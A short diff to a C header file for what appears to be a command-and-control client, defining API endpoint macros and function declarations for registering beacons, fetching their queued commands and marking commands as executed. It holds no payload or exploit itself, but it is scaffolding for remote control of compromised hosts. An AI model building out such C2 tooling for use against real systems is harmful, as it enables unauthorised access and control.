@@ -8,8 +8,9 @@
 #define C2_API_BEACON_UNEXEC C2_API_BEACON_COMMANDS "?unexec_only=true"
 
 #define C2_API_COMMAND_REGISTER C2_API_ADDR "/command/register"
-#define C2_API_COMMAND_EXECUTED C2_API_ADDR "/command/%d/executed"
+#define C2_API_COMMAND_EXECUTE C2_API_ADDR "/command/execute"
 
 int register_beacon(char* ip, char* hostname);
 struct Beacon* get_beacon(int beacon_id);
 struct Command** get_beacon_commands(int beacon_id, bool unexec_only);
+void mark_command_executed(struct Command* command);
